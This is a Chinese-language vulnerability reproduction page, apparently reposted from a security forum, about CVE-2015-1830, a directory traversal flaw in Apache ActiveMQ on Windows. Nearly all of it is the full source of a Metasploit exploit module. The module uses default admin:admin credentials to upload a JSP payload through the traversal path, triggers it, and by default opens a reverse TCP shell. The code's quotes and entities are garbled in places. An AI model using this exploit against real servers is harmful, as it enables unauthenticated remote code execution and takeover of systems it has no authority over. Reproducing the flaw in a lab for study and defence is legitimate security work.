# （CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce

> 原文：[https://www.zhihuifly.com/t/topic/2799](https://www.zhihuifly.com/t/topic/2799)

# （CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce

## 一、漏洞简介

Windows 5.11.2之前的Apache ActiveMQ 5.x中blob消息的文件服务器上载/下载功能中的目录遍历漏洞允许远程攻击者通过未指定的向量在任意目录中创建JSP文件。

## 二、漏洞影响

ActiveMQ 5.11.1

## 三、复现过程

### msf poc

> 直接在msf里面搜索就行了，如果没有请更新msf版本，或者手动复制下面的脚本到msf目录下。

```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

Rank = ExcellentRanking

include Msf::Exploit::Remote::HttpClient

def initialize(info = {})

super(update_info(info,

‘Name’           => ‘Apache ActiveMQ 5.x-5.11.1 Directory Traversal Shell Upload’,

‘Description’    => %q{

This module exploits a directory traversal vulnerability (CVE-2015-1830) in Apache

ActiveMQ 5.x before 5.11.2 for Windows.

```
 The module tries to upload a JSP payload to the /admin directory via the traversal
    path /fileserver/..\\admin\\ using an HTTP PUT request with the default ActiveMQ
    credentials admin:admin (or other credentials provided by the user). It then issues
    an HTTP GET request to /admin/&lt;payload&gt;.jsp on the target in order to trigger the
    payload and obtain a shell.
  },
  'Author'          =&gt;
    [
      'David Jorm',     # Discovery and exploit
      'Erik Wynter'     # @wyntererik - Metasploit
    ],
  'References'     =&gt;
    [
      [ 'CVE', '2015-1830' ],
      [ 'EDB', '40857'],
      [ 'URL', 'https://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt' ]
    ],
  'Privileged'     =&gt; false,
  'Platform'    =&gt; %w{ win },
  'Targets'     =&gt;
    [
      [ 'Windows Java',
        {
          'Arch' =&gt; ARCH_JAVA,
          'Platform' =&gt; 'win'
        }
      ],
    ],
  'DisclosureDate' =&gt; '2015-08-19',
  'License'        =&gt; MSF_LICENSE,
  'DefaultOptions'  =&gt; {
    'RPORT' =&gt; 8161,
    'PAYLOAD' =&gt; 'java/jsp_shell_reverse_tcp'
    },
  'DefaultTarget'  =&gt; 0))

register_options([
  OptString.new('TARGETURI', [true, 'The base path to the web application', '/']),
  OptString.new('PATH',      [true, 'Traversal path', '/fileserver/..\\admin\\']),
  OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),
  OptString.new('PASSWORD', [true, 'Password to authenticate with', 'admin'])
]) 
```

end

def check

print_status(“Running check…”)

testfile = Rex::Text::rand_text_alpha(10)

testcontent = Rex::Text::rand_text_alpha(10)

```
send_request_cgi({
  'uri'       =&gt; normalize_uri(target_uri.path, datastore['PATH'], "#{testfile}.jsp"),
  'headers'     =&gt; {
    'Authorization' =&gt; basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
    },
  'method'    =&gt; 'PUT',
  'data'      =&gt; "&lt;% out.println(\"#{testcontent}\");%&gt;"
})

res1 = send_request_cgi({
  'uri'       =&gt; normalize_uri(target_uri.path,"admin/#{testfile}.jsp"),
  'headers'     =&gt; {
    'Authorization' =&gt; basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
    },
  'method'    =&gt; 'GET'
})

if res1 &amp;&amp; res1.body.include?(testcontent)
  send_request_cgi(
    opts = {
      'uri'       =&gt; normalize_uri(target_uri.path,"admin/#{testfile}.jsp"),
      'headers'     =&gt; {
        'Authorization' =&gt; basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
        },
      'method'    =&gt; 'DELETE'
    },
    timeout = 1
  )
  return Exploit::CheckCode::Vulnerable
end

Exploit::CheckCode::Safe 
```

end

def exploit

print_status(“Uploading payload…”)

testfile = Rex::Text::rand_text_alpha(10)

vprint_status(“If upload succeeds, payload will be available at #{target_uri.path}admin/#{testfile}.jsp”) #This information is provided to allow for manual execution of the payload in case the upload is successful but the GET request issued by the module fails.

```
send_request_cgi({
  'uri'       =&gt; normalize_uri(target_uri.path, datastore['PATH'], "#{testfile}.jsp"),
  'headers'     =&gt; {
    'Authorization' =&gt; basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
    },
  'method'    =&gt; 'PUT',
  'data'      =&gt; payload.encoded
})

print_status("Payload sent. Attempting to execute the payload.")
res = send_request_cgi({
  'uri'       =&gt; normalize_uri(target_uri.path,"admin/#{testfile}.jsp"),
  'headers'     =&gt; {
    'Authorization' =&gt; basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
  },
  'method'    =&gt; 'GET'
})
if res &amp;&amp; res.code == 200
  print_good("Payload executed!")
else
  fail_with(Failure::PayloadFailed, "Failed to execute the payload")
end 
``` `end

end` 
```